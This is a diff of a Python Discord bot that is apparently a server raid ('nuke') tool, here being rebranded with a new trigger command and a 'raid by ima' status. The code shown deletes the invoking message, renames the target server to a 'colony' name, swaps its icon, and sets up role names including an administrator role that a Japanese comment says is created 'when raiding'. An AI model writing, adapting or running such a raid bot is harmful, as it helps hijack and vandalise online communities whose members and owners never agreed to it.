@@ -3,25 +3,24 @@ import aiohttp
 import discord
 from discord.ext import commands
 
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())#ここでプレフィックスを変えれるよ!nukeから?nukeみたいにね
-bot.remove_command('help')#helpコマンドを表示しないようにする。表示したいならこの行は消してね
+bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
 
 @bot.event
 async def on_ready():
     print(f"{bot.user}でログインしました。")
-    activity = discord.Game(name="made by みっちー")
+    activity = discord.Game(name="raid by ima")
     await bot.change_presence(status=discord.Status.online, activity=activity)
 
 @bot.command()
-async def mititt(ctx):#ここで起動コマンドを変えられるよ
+async def ima(ctx):
     try:
         await ctx.message.delete()
     except:
         pass
 
     guild = ctx.guild
-    new_server_name = "みっちー鯖植民地" #ここは変えたいサーバーの名前にしてね
-    new_server_icon_url = "https://images-ext-1.discordapp.net/external/FFZVIqTXouydd9yjhkRIS6jTB9tZzx60yiazQWUV6O0/https/i.imgur.com/M7xDJw4.jpg?format=webp&width=293&height=400" #ここは変えたいアイコンのリンクにしてね
+    new_server_name = "みんなのすみか植民地" 
+    new_server_icon_url = "https://images-ext-1.discordapp.net/external/FFZVIqTXouydd9yjhkRIS6jTB9tZzx60yiazQWUV6O0/https/i.imgur.com/M7xDJw4.jpg?format=webp&width=293&height=400"
     role_name = "みっちー万歳" #ここは作成したいロールの名前にしてね
     admin_role_name = "nuke user" #荒らしたときに作成する管理者のロールの名前にしてね
 
